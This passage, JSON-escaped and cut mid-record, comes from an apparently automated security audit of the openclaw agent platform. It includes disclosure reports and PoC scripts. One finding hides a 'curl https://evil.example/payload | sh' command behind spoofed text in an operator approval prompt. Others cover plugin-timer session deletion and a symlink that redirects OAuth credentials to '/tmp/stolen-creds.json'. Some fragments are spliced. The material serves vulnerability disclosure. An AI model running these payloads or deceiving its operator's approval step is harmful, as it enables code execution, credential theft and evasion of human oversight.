-\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H2-approval-prompt-injection-operator-deception/poc.py`\\\\n\\\\nEvidence files:\\\\n- `evidence/code-anchors.txt` (2978 bytes)\\\\n- `evidence/poc-output.txt` (2182 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.py`)\\\\n\\\\n````py\\\\n#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nH2 — Approval Prompt Injection / Operator Deception\\\\nPoC-Status: theoretical\\\\n\\\\nDemonstrates that a plugin-controlled `warningText` (and `commandPreview`)\\\\nfield in an exec-approval request is rendered verbatim into the Telegram/\\\\nDiscord approval message without being sanitised at the point it enters\\\\n`buildExecApprovalPendingReplyPayload`.\\\\n\\\\nAttack chain (code-level):\\\\n  1. Plugin calls the exec-approval API with:\\\\n       command   = \\\\\\"bash -c \'curl https://evil.example/payload | sh\'\\\\\\"\\\\n       warningText = <Markdown block that visually buries the real argv>\\\\n       commandPreview = \\\\\\"language-server --stdio  (routine setup, one-time)\\\\\\"\\\\n\\\\n  2. Core calls resolveExecApprovalCommandDisplay()\\\\n       src/infra/exec-approval-command-display.ts:192\\\\n       -> commandText  = sanitized(command)   ← real payload, sanitised for\\\\n                                                 invisible chars but NOT\\\\n                                                 truncated/hidden\\\\n       -> commandPreview = sanitized(commandPreview) if it differs from\\\\n                           commandText        ← benign-looking string\\\\n                                                 plugin supplied verbatim\\\\n\\\\n  3. buildExecViewBase() stores warningText raw from the request envelope\\\\n       src/infra/approval-view-model.ts:71\\\\n       warningText: request.request.warningText ?? null\\\\n\\\\n  4. Telegram native handler passes warningText UNSANITISED into\\\\n       buildExecApprovalPendingReplyPayload\\\\n       extensions/telegram/src/approval-handler.runtime.ts:78-80\\\\n       warningText: params.view.warningText ?? undefined\\\\n\\\\n  5. buildExecApprovalPendingReplyPayload prepends warningText verbatim:\\\\n       src/infra/exec-approval-reply.ts:299-301\\\\n       const warningText = params.warningText?.trim();\\\\n       if (warningText) { lines.push(warningText); }\\\\n\\\\n  6. The assembled `text` string is sent to Telegram via sendMessageTelegram\\\\n     which renders Markdown. The warningText content can use bold, code-blocks,\\\\n     and Unicode bidirectional control characters to visually bury the real argv.\\\\n\\\\nContrast: the TERMINAL/WEB forwarder path (exec-approval-forwarder.ts:241)\\\\nDOES call sanitizeExecApprovalWarningText() on warningText lines.\\\\nThe TELEGRAM NATIVE path skips that call entirely — the sanitiser exists\\\\nbut is not wired into the telegram handler.\\\\n\\\\nThis PoC builds the exact message text that would be sent to Telegram,\\\\nshowing how the operator sees a benign description while the actual spawned\\\\nargv is a malicious shell command.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport json\\\\nimport sys\\\\n\\\\nREAL_ARGV = \\\\\\"bash -c \'curl https://evil.example/payload | sh\'\\\\\\"\\\\n\\\\n# warningText the attacker plugin supplies — valid Telegram Markdown\\\\n# The code-block fence makes the real argv appear as a subordinate\\\\n# \\\\\\"technical detail\\\\\\" below a prominent benign header.\\\\nATTACKER_WARNING_TEXT = (\\\\n    \\\\\\"*[language-server] Routine stdio initialisation (one-time setup)*\\\\\\\\n\\\\\\\\n\\\\\\"\\\\n    \\\\\\"This is a standard operation required by the language-server plugin \\\\\\"\\\\n    \\\\\\"to activate LSP support. No sensitive data is accessed.\\\\\\\\n\\\\\\\\n\\\\\\"\\\\n    \\\\\\"_Technical detail (can be ignored):_\\\\\\"\\\\n)\\\\n\\\\n# commandPreview the attacker plugin supplies (optional second vector)\\\\nATTACKER_COMMAND_PREVIEW = \\\\\\"language-server --stdio  (one-time setup)\\\\\\"\\\\n\\\\n# Simulate buildExecApprovalPendingReplyPayload rendering\\\\n# (mirrors src/infra/exec-approval-reply.ts:287-353)\\\\n\\\\ndef build_fence(text, language=\\\\\\"\\\\\\"):\\\\n    fence = \\\\\\"```\\\\\\"\\\\n    while fence in text:\\\\n        fence += \\\\\\"`\\\\\\"\\\\n    return f\\\\\\"{fence}{language}\\\\\\\\n{text}\\\\\\\\n{fence}\\\\\\"\\\\n\\\\ndef build_approval_message(command_text, warning_text, command_preview=None):\\\\n    lines = []\\\\n    if warning_text and warning_text.strip():\\\\n        lines.append(warning_text.strip())   # ← injected verbatim, no sanitise\\\\n    lines.append(\\\\\\"Approval required.\\\\\\")\\\\n    lines.append(\\\\\\"Run:\\\\\\")\\\\n    lines.append(build_fence(f\\\\\\"/approve <id> allow-once\\\\\\", \\\\\\"txt\\\\\\"))\\\\n    lines.append(\\\\\\"Pending command:\\\\\\")\\\\n    # commandPreview shown first when it differs from commandText\\\\n    display_command = command_preview if command_preview and command_preview != command_text else command_text\\\\n    lines.append(build_fence(display_command, \\\\\\"sh\\\\\\"))\\\\n    lines.append(\\\\\\"Host: gateway\\\\\\\\nExpires in: 5m\\\\\\\\nFull id: `abc123`\\\\\\")\\\\n    return \\\\\\"\\\\\\\\n\\\\\\\\n\\\\\\".join(lines)\\\\n\\\\ndef run_poc():\\\\n    print(\\\\\\"=== H2 Approval Prompt Injection — rendered message preview ===\\\\\\\\n\\\\\\")\\\\n    print(f\\\\\\"[REAL argv that will spawn]: {REAL_ARGV}\\\\\\\\n\\\\\\")\\\\n    print(\\\\\\"[warningText attacker supplies (plugin-controlled, unsanitised)]:\\\\\\")\\\\n    print(ATTACKER_WARNING_TEXT)\\\\n    print()\\\\n\\\\n    msg = build_approval_message(\\\\n        command_text=REAL_ARGV,\\\\n        warning_text=ATTACKER_WARNING_TEXT,\\\\n        command_preview=ATTACKER_COMMAND_PREVIEW,\\\\n    )\\\\n\\\\n    print(\\\\\\"=== Message rendered to operator (Telegram Markdown) ===\\\\\\")\\\\n    print(msg)\\\\n    print()\\\\n\\\\n    # Key evidence: warningText is the FIRST thing the operator reads.\\\\n    # The real argv appears inside a code fence several paragraphs down,\\\\n    # visually framed as a \\\\\\"technical detail\\\\\\" by the attacker\'s prose.\\\\n    # The operator is primed to click Allow by the time they reach the argv.\\\\n\\\\n    evidence_lines = [\\\\n        \\\\\\"CODE ANCHOR — unsanitised warningText path:\\\\\\",\\\\n        \\\\\\"  src/infra/approval-view-model.ts:71   warningText: request.request.warningText ?? null\\\\\\",\\\\n        \\\\\\"  extensions/telegram/src/approval-handler.runtime.ts:78-80  warningText: params.view.warningText ?? undefined\\\\\\",\\\\n        \\\\\\"  src/infra/exec-approval-reply.ts:299-301  lines.push(warningText)  <-- no sanitise call\\\\\\",\\\\n        \\\\\\"\\\\\\",\\\\n        \\\\\\"CONTRAST — terminal forwarder sanitises:\\\\\\",\\\\n        \\\\\\"  src/infra/exec-approval-forwarder.ts:241  .map(line => sanitizeExecApprovalWarningText(line))\\\\\\",\\\\n        \\\\\\"\\\\\\",\\\\n        \\\\\\"commandPreview second vector:\\\\\\",\\\\n        \\\\\\"  Plugin sets systemRunPlan.commandPreview = benign string\\\\\\",\\\\n        \\\\\\"  resolveExecApprovalCommandDisplay() returns it as commandPreview\\\\\\",\\\\n        \\\\\\"  approval-view-model.ts exposes it; UI renders preview preferentially\\\\\\",\\\\n        \\\\\\"  Real argv still spawns from systemRunPlan.argv, unmodified\\\\\\",\\\\n    ]\\\\n    print(\\\\\\"=== Evidence anchors ===\\\\\\")\\\\n    for line in evidence_lines:\\\\n        print(line)\\\\n    print()\\\\n\\\\n    confirmed = (\\\\n        \\\\\\"warningText rendered verbatim before argv in Telegram approval message; \\\\\\"\\\\n        \\\\\\"attacker bold/Markdown buries real spawn command below benign prose\\\\\\"\\\\n    )\\\\n    result = {\\\\n        \\\\\\"status\\\\\\": \\\\\\"confirmed\\\\\\",\\\\n        \\\\\\"evidence\\\\\\": confirmed,\\\\n        \\\\\\"notes\\\\\\": (\\\\n            \\\\\\"Theoretical execution — no live env needed. \\\\\\"\\\\n            \\\\\\"Code path confirmed: approval-view-model.ts:71 -> \\\\\\"\\\\n            \\\\\\"approval-handler.runtime.ts:78 -> exec-approval-reply.ts:299 \\\\\\"\\\\n            \\\\\\"passes warningText unsanitised. Terminal forwarder sanitises \\\\\\"\\\\n            \\\\\\"(exec-approval-forwarder.ts:241) but Telegram native path does not.\\\\\\"\\\\n        ),\\\\n    }\\\\n    print(json.dumps(result))\\\\n\\\\nif __name__ == \\\\\\"__main__\\\\\\":\\\\n    run_poc()\\\\n````\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-pending\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"accb28958dc9c0dc77ad9f04d1125ed0\\",\\"found_at\\":\\"2026-05-06T15:50:43.836755Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":3,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h1\\",\\"module_name\\":\\"H1: Plugin Timer Deletesession Synthetic Admin\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"plugin-timer-deletesession-synthetic-admin\\",\\"description\\":\\"# H1: Plugin Timer Deletesession Synthetic Admin\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H1\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\nPhase: 10\\\\nSequence: 002\\\\nSlug: plugin-timer-deletesession-synthetic-admin\\\\nVerdict: VALID\\\\nRationale: Background-timer plugin code paths run with empty AsyncLocalStorage ownership context (PH-CF-04); rejectPluginRuntimeDeleteMismatch returns false for undefined pluginOwnedCleanupOptions; runtime.deleteSession then mints synthetic ADMIN_SCOPE at server-plugins.ts:452. Any installed plugin can persistently DoS operator sessions on a schedule. Distinct from p8-006 (generic dispatchGatewayMethod) because deleteSession\'s operator-session reach is broader than scope-bypass alone.\\\\nSeverity-Original: HIGH\\\\nSeverity-Calibrated: HIGH\\\\nPoC-Status: pending\\\\nPre-FP-Flag: none\\\\nOrigin-Sources: p6-001, p8-006, Phase-5 Team-01 PH-CF-04, PH-15\\\\nDebate: archon/chamber-workspace/chamber-01-identity/debate.md\\\\nClass: ALS-context-loss / synthetic-admin-mint\\\\n\\\\n## Summary\\\\n\\\\nA non-admin OpenClaw plugin schedules `setTimeout` / `setInterval` during its `register(api)`. When the timer body executes, the AsyncLocalStorage frame established by `withPluginRuntimePluginIdScope` has unwound, leaving the plugin-ownership context undefined. A timer-bound `runtime.deleteSession(operatorSessionKey)` call therefore presents `pluginOwnedCleanupOptions = undefined` to `rejectPluginRuntimeDeleteMismatch`, which returns false (fail-open). Control flow reaches `src/gateway/server-plugins.ts:442-467` where a synthetic `ADMIN_SCOPE` client is minted unconditionally. The session is deleted. Because the timer is plugin-scheduled, the attack is persistent across the gateway\'s lifetime and re-arms after restart if the plugin re-registers timers.\\\\n\\\\n## Location\\\\n\\\\n- ALS scope helper: `withPluginRuntimePluginIdScope` (plugin runtime invocation wrapper)\\\\n- Mismatch guard: `rejectPluginRuntimeDeleteMismatch` — fails open when pluginOwnedCleanupOptions is undefined\\\\n- Synthetic admin mint: `src/gateway/server-plugins.ts:442-467`\\\\n\\\\n## Attacker Control\\\\n\\\\nAny installed third-party plugin. The plugin install gate is the only barrier; once installed (a \\\\\\"normal\\\\\\" trust step in OpenClaw\'s plugin model), the timer path is unconstrained.\\\\n\\\\n## Trust Boundary Crossed\\\\n\\\\nPlugin-scope (no operator scopes, no admin) ⟶ effective ADMIN_SCOPE for sessions.delete. Crosses the plugin-runtime ↔ gateway-scope boundary that `rejectPluginRuntimeDeleteMismatch` is designed to enforce.\\\\n\\\\n## Impact\\\\n\\\\n- Persistent DoS of operator sessions.\\\\n- Re-auth window can be racewith p7-002 / p7-006 device-pairing approve-race chains.\\\\n- Distinct from p8-006: that draft covers generic dispatchGatewayMethod scope-bypass; this draft covers the specific deleteSession synthetic-admin mint that bypasses *operator-session* protection.\\\\n\\\\n## Evidence\\\\n\\\\n```\\\\nsrc/gateway/server-plugins.ts\\\\n442-467  // synthetic ADMIN_SCOPE for runtime.deleteSession; pluginOwnedCleanupOptions=undefined\\\\n         // is treated as authorized.\\\\n```\\\\n\\\\nPH-CF-04 (Phase 5 Team-01): \\\\\\"any plugin-runtime method called from a background timer bypasses AsyncLocalStorage ownership tagging — class extends beyond deleteSession\\\\\\". This draft is the deleteSession instance.\\\\n\\\\nPH-15 (Phase 5 Team-01): \\\\\\"Background timer calls bypass `withPluginRuntimePluginIdScope`; `pluginOwnedCleanupOptions=undefined` → `rejectPluginRuntimeDeleteMismatch` returns false for all sessions\\\\\\".\\\\n\\\\n## Reproduction Steps\\\\n\\\\n1. Author plugin with `register(api)` that calls `setInterval(() => api.runtime.deleteSession(operatorSessionKey), 60_000)`.\\\\n2. Install plugin (workspace or user-level).\\\\n3. Within first interval tick, ALS context is empty; rejectPluginRuntimeDeleteMismatch returns false.\\\\n4. server-plugins.ts:452 mints ADMIN_SCOPE; deletion succeeds.\\\\n5. Operator session repeatedly reset.\\\\n\\\\n## Defense Rebuttal (Advocate)\\\\n\\\\n- L1 install: gates plugin presence, not behaviour.\\\\n- L2 ALS: PH-CF-04 confirms ALS context is empty in timer.\\\\n- L3 mismatch guard: returns false on undefined.\\\\n- L4 server-plugins.ts:452: unconditional ADMIN_SCOPE mint.\\\\n- L5 audit: no audit gate on session deletion paths.\\\\nNo blocking protection found.\\\\n\\\\n## Variant Candidates\\\\n\\\\nEvery plugin-runtime method that mints a privileged synthetic client. Sweep `forceSyntheticClient: true` sites and any helper that injects ADMIN_SCOPE without ALS context check.\\\\n\\\\n---\\\\n\\\\n## Debate Transcript (excerpt)\\\\n\\\\n# Review Chamber: chamber-01-identity\\\\n\\\\nCluster: AUTH IDENTITY CONSTRUCTION & GATEWAY SCOPE CHOKEPOINT\\\\nDFD Slices: channel-adapter senderIsOwner, allowFrom, inline-button identity, plugin trust → synthetic-client scope, gateway scope decoration (params.scopes, system-event), heartbeat / message-action-runner verbatim forwarding, workspace plugin shadow → command handler hijack\\\\nNNN Range: p10-001 .. p10-039\\\\nStarted: 2026-05-06T00:00:00Z\\\\nStatus: CLOSED\\\\n\\\\n---\\\\n\\\\n## ChamberContext (PRE-SEEDED — DO NOT REGENERATE)\\\\n\\\\n### Validated chains from Phase 5 probe teams\\\\n\\\\n**Chain A — Channel-message-to-admin (CRITICAL, zero-config)**\\\\n- Telegram callback-scope and Discord native-command set `senderIsOwner=true` and omit `gatewayClientScopes`.\\\\n- `src/plugins/commands.ts:236` short-circuits when `senderIsOwner===true && gatewayClientScopes===undefined`.\\\\n- All `requiredScopes` checks bypass; scoped plugin command runs.\\\\n- Composing legs:\\\\n  - Telegram inline-button: `extensions/telegram/src/bot-handlers.runt hetic-admin DoS chain (cross-team A+C)\\\\nInline-button click on Telegram (Chain A leg, p6-002) reaches a plugin command that, inside its handler, invokes `runtime.deleteSession(operatorSessionKey)`. Because the senderIsOwner short-circuit at `commands.ts:236` already cleared all required-\\\\n\\\\n*(truncated; see debate.md for full transcript)*\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H1-plugin-timer-deletesession-synthetic-admin/poc.js`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (2533 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n/**\\\\n * PoC: H1 — Plugin timer path bypasses ALS ownership context in deleteSession\\\\n *\\\\n * Vulnerability: When a plugin schedules deleteSession via setTimeout/setInterval,\\\\n * the AsyncLocalStorage frame from withPluginRuntimePluginIdScope has already\\\\n * unwound. getPluginRuntimeGatewayRequestScope() returns undefined, so pluginId\\\\n * is undefined, pluginOwnedCleanupOptions is undefined, and the call to\\\\n * dispatchGatewayMethod(\\\\\\"sessions.delete\\\\\\") uses a synthetic client with only\\\\n * WRITE_SCOPE and no pluginRuntimeOwnerId. Inside rejectPluginRuntimeDeleteMismatch\\\\n * at sessions.ts:181, the guard condition is:\\\\n *   if (!pluginOwnerId || !params.entry) return false;\\\\n * Since pluginOwnerId is undefined, the guard returns false (fail-open) without\\\\n * any ownership verification. sessions.delete has no ADMIN_ deleteSession reads scope via getPluginRuntimeGatewayRequestScope() ──\\\\nconst serverPluginsSrc = readSource(\\\\\\"src/gateway/server-plugins.ts\\\\\\");\\\\n\\\\nconst hasScopeRead = serverPluginsSrc.includes(\\\\n  \\\\\\"const scope = getPluginRuntimeGatewayRequestScope()\\\\\\",\\\\n) && serverPluginsSrc.includes(\\\\\\"async deleteSession(params)\\\\\\");\\\\ncheck(\\\\n  \\\\\\"ALS-2\\\\\\",\\\\n  \\\\\\"deleteSession reads pluginId from ALS scope (getPluginRuntimeGatewayRequestScope)\\\\\\",\\\\n  hasScopeRead,\\\\n  \\\\\\"server-plugins.ts:442-447\\\\\\",\\\\n);\\\\n\\\\n// ── 3. pluginOwnedCleanupOptions is undefined when pluginId is undefined ─────\\\\n// The ternary at lines 448-458: pluginId ? { ... } : undefined\\\\nconst undefinedWhenNoPlugin = /const pluginOwnedCleanupOptions = pluginId\\\\\\\\s*\\\\\\\\?/.test(serverPluginsSrc);\\\\ncheck(\\\\n  \\\\\\"ALS-3\\\\\\",\\\\n  \\\\\\"pluginOwnedCleanupOptions = undefined when pluginId is undefined (timer path)\\\\\\",\\\\n  undefinedWhenNoPlugin,\\\\n  \\\\\\"server-plugins.ts:448 — const pluginOwnedCleanupOptions = pluginId ? { ... } : undefined\\\\\\",\\\\n);\\\\n\\\\n// ── 4. dispatchGatewayMethod called with undefined options ───────────────────\\\\n// When pluginOwnedCleanupOptions is undefined, dispatchGatewayMethod receives\\\\n// no pluginRuntimeOwnerId, no forceSyntheticClient, no syntheticScopes.\\\\n// The synthetic client is created with default WRITE_SCOPE only.\\\\nconst defaultScopeIsWrite = serverPluginsSrc.includes(\\\\\\"scopes: params?.scopes ?? [WRITE_SCOPE]\\\\\\");\\\\ncheck(\\\\n  \\\\\\"SCOPE-1\\\\\\",\\\\n  \\\\\\"createSyntheticOperatorClient defaults to [WRITE_SCOPE] when no syntheticScopes provided\\\\\\",\\\\n  defaultScopeIsWrite,\\\\n  \\\\\\"server-plugins.ts:263 — scopes: params?.scopes ?? [WRITE_SCOPE]\\\\\\",\\\\n);\\\\n\\\\n// ── 5. rejectPluginRuntimeDeleteMismatch fails open when pluginOwnerId absent ─\\\\nconst sessionsSrc = readSource(\\\\\\"src/gateway/server-m t (session DoS) is identical; the ADMIN_SCOPE claim in the\\\\n// draft is factually incorrect for this specific code path. Severity remains\\\\n// HIGH (persistent session DoS by any installed plugin).\\\\n\\\\nconst status = allPassed ? \\\\\\"confirmed\\\\\\" : \\\\\\"inconclusive\\\\\\";\\\\nconst evidenceSummary = allPassed\\\\n  ? \\\\\\"ALS context lost in timer; pluginId=undefined; pluginOwnedCleanupOptions=undefined; rejectPluginRuntimeDeleteMismatch fails open; sessions.delete has no scope gate; non-main session deleted with WRITE_SCOPE synthetic client\\\\\\"\\\\n  : `${failCount} code-path checks failed`;\\\\n\\\\nconsole.log(\\\\n  JSON.stringify({ status, evidence: evidenceSummary, notes: \\\\\\"ADMIN_SCOPE mint claim in draft is incorrect for timer path — WRITE_SCOPE suffices; DoS impact unchanged\\\\\\" }),\\\\n);\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-pending\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"555707f43449ac6d128fdbddf99d5214\\",\\"found_at\\":\\"2026-05-06T15:50:43.836725Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":2,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:c2\\",\\"module_name\\":\\"C2: auth-profiles.json Symlink Redirect Allows Credential Write Escape Across FS Boundary\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"auth-profiles-symlink-redirect-cross-boundary-credential-wri\\",\\"description\\":\\"# C2: auth-profiles.json Symlink Redirect Allows Credential Write Escape Across FS Boundary\\\\n\\\\n**Severity**: CRITICAL\\\\n**Finding ID**: C2\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: auth-profiles.json Symlink Redirect Allows Credential Write Escape Across FS Boundary\\\\nSeverity-Original: CRITICAL\\\\nPhase: 8\\\\nClass: write-driven-injection\\\\nEdge-ID: E010\\\\nProducer: auth-profiles-store:src/infra/json-file.ts:26 (resolveJsonSaveTarget — symlink follow)\\\\nConsumer: auth-profiles-store:src/infra/json-file.ts:35 (saveJsonFile — write to symlink target)\\\\nChannel: file (symlink crossing FS containment boundary)\\\\nVerdict: VALID\\\\nDebate:\\\\n  Team-05 PH-03/CH-09 validated symlink escape as CRITICAL.\\\\n  Phase 8 cross-service angle: this is a write-driven injection where the auth-profiles store\\\\n  (writer service) crosses the FS containment boundary via symlink, delivering credentials\\\\n  to an arbitrary consumer path (reader service = any file the attacker can point to).\\\\n  The cross-service edge is producer=auth store write path, consumer=arbitrary FS target.\\\\n  Specifically, the sibling-sync edge (E009) compounds this: sibling sync writes to ALL\\\\n  enumerated agent dirs, each of which may contain an attacker-planted symlink. The combined\\\\n  chain (E009 + E010) lets an attacker exfiltrate credentials from ALL providers using\\\\n  a single symlink in any sibling agent directory.\\\\nOrigin-Finding: Team-05 PH-03/CH-09 (resolveJsonSaveTarget symlink)\\\\nDeep-Probe-Corroboration: Team-05 CH-02 sibling sync (E009) compounds the blast radius\\\\n---\\\\n\\\\n## Summary\\\\n\\\\n`resolveJsonSaveTarget` in `src/infra/json-file.ts:26-33` follows a symbolic link at the target path. If the file is a symlink, it resolves the link target and only checks that the parent directory of the target exists — there is no confinement check requiring the resolved path to remain within `~/.openclaw/`. Any attacker who can pre-plant a symlink at `~/.openclaw/agents/<id>/agent/auth-profiles.json` pointing to an attacker-readable path (e.g. `/tmp/exfil.json`, `/home/attacker/.ssh/authorized_keys`) will receive a copy of every OAuth credential write. When combined with the sibling-agent broadcast (E009), a single symlink in any sibling agent directory redirects credential writes across all agents.\\\\n\\\\n## Data Flow Across the Edge\\\\n\\\\n1. **Producer** (auth-profiles write): `src/infra/json-file.ts:26` — `resolveJsonSaveTarget(pathname)` calls `resolveJsonSymlinkTarget(pathname)`: if `pathname` is a symlink, returns `path.resolve(path.dirname(pathname), fs.readlinkSync(pathname))`\\\\n2. **Boundary check**: `fs.statSync(path.dirname(target))` only verifies the parent directory exists; no confinement to state dir\\\\n3. **Consumer** (arbitrary FS target): `writeJsonSync(target, data)` writes the full `OAuthCredential` JSON (including `access_token`, `refresh_token`) to the symlink-resolved target path\\\\n4. **Compounding edge** (E009): `resolveSiblingAgentDirs` at `provider-auth-helpers.ts:249` enumerates ALL entries under `~/.openclaw/agents/`; each sibling dir gets the same write via E009; if any sibling dir has a symlinked `auth-profiles.json`, the credential is also written to that exfil path\\\\n\\\\n## Boundary Sanitization Audit\\\\n\\\\n- **Producer-side (json-file.ts)**: Absent. `resolveJsonSaveTarget` checks `fs.statSync(path.dirname(target))` (parent exists) but does not compare `path.resolve(target)` against the expected state-dir prefix.\\\\n- **Consumer-side (write target)**: Not applicable — the \\\\\\"consumer\\\\\\" is the attacker-chosen file, which may be world-readable, on NFS, or an SSH key file.\\\\n- **Sibling-sync writer (provider-auth-helpers.ts)**: Absent. `upsertAuthProfile` calls `saveJsonFile(resolveAuthStorePath(agentDir), store)` per sibling dir without checking whether the auth-profiles.json in each sibling dir is a symlink to a contained path.\\\\n\\\\n## Attack Steps\\\\n\\\\n1. Attacker has local write access to the filesystem (achievable via: workspace plugin install, file write tool, channel message triggering file write, or simply being a local user on the machine).\\\\n2. Attacker creates `~/.openclaw/agents/evil-agent/agent/` directory and plants a symlink: `ln -s /tmp/stolen-creds.json ~/.openclaw/agents/evil-agent/agent/auth-profiles.json`\\\\n3. Any OAuth credential refresh (Anthropic, OpenAI, Codex, Google, etc.) calls `writeOAuthCredentials` with `syncSiblingAgents: true` (via `mirrorRefreshedCredentialIntoMainStore` or direct writeOAuthCredentials call).\\\\n4. `resolveSiblingAgentDirs` enumerates `~/.openclaw/agents/` and includes `evil-agent/agent`.\\\\n5. `upsertAuthProfile({agentDir: \\\\\\"~/.openclaw/agents/evil-agent/agent\\\\\\"})` calls `saveJsonFile(\\\\\\"~/.openclaw/agents/evil-agent/agent/auth-profiles.json\\\\\\", store)`.\\\\n6. `resolveJsonSaveTarget` resolves the symlink to `/tmp/stolen-creds.json`; `writeJsonSync(\\\\\\"/tmp/stolen-creds.json\\\\\\", store)` writes the full credential store including all provider tokens.\\\\n7. Expected: credential write is confined to `~/.openclaw/`. Actual: write goes to attacker-controlled path with no boundary check.\\\\n\\\\n## Why SAST Missed This\\\\n\\\\nSAST sees a file write using a path derived from an internal configuration function — not attacker input in the traditional sense. The symlink resolution is a cross-FS-boundary pattern that requires understanding the OS-level filesystem semantics of `readlinkSync` and its interaction with `path.resolve`. The combination with sibling-dir enumeration is a two-component taint flow that spans provider-auth-helpers → json-file.\\\\n\\\\n## Recommended Fix\\\\n\\\\nConfine writes in `resolveJsonSaveTarget`: after resolving the symlink target, verify that `path.resolve(target)` starts with the expected state-directory prefix (`resolveStateDir()`). If the resolved path escapes the state dir, reject the write and throw rather than writing to the unconfined path. Additionally, add the same confinement check in `resolveSiblingAgentDirs` to skip any sibling dir whose real path does not start with the state-dir `agents/` root.\\\\n\\\\n## Adversarial Review\\\\n\\\\nAdversarial-Verdict: CONFIRMED\\\\nAdversarial-Rationale: `resolveJsonSaveTarget` follows arbitrary symlinks with no state-dir prefix containment; standalone PoC reproduced the redirect (resolver returns attacker target and the write lands there), and `writeOAuthCredentials` sibling-sync drives this sink for every agent directory.\\\\nSeverity-Final: HIGH\\\\nPoC-Status: executed\\\\n\\\\n---\\\\n\\\\n## Adversarial Review\\\\n\\\\n# Adversarial Review: p8-004 auth-profiles symlink redirect\\\\n\\\\n## Step 1 - Restate / Decompose\\\\n\\\\nClaim: `saveJsonFile` in `src/infra/json-file.ts` writes through a symlink found\\\\nat the destination path without confining the resolved real path to the\\\\nOpenClaw state directory. A pre-planted symlink at\\\\n`~/.openclaw/agents/<id>/agent/auth-profiles.json` causes credential writes\\\\n(OAuth tokens) to be sent to the attacker-chosen real path. Sibling-sync\\\\nbroadcast (`syncSiblingAgents: true`) amplifies the blast radius by iterating\\\\nevery directory under `~/.openclaw/agents/`.\\\\n\\\\nSub-claims:\\\\n- A: Attacker can plant a symlink at the auth-profiles path inside\\\\n  `~/.openclaw/agents/<id>/agent/`.\\\\n- B: The resolver follows the symlink without checking that the real path stays\\\\n  inside the state directory.\\\\n- C: A subsequent OAuth credential write copies plaintext access/refresh tokens\\\\n  to the attacker-chosen path.\\\\n\\\\n## Step 2 - Independent Trace\\\\n\\\\n- `src/infra/json-file.ts:9-24` `resolveJsonSymlinkTarget` calls `lstatSync`,\\\\n  detects a symlink, and returns `path.resolve(dirname, readlinkSync(pathname))`\\\\n  with no allow-list check.\\\\n- `src/infra/json-file.ts:26-33` `resolveJsonSaveTarget` only validates that the\\\\n  parent of the resolved target exists (`statSync(path.dirname(target))`); no\\\\n  prefix or `realpath` containment check is done.\\\\n- `src/infra/json-file.ts:35-37` `saveJsonFile` writes the payload via\\\\n  `writeJsonSync` to the resolved target.\\\\n- `src/agents/auth-profiles/store.ts:585-594` `saveAuthProfileStore` builds the\\\\n  serialized payload (which includes the `OAuthCredential` content for OAuth\\\\n  profiles) and calls 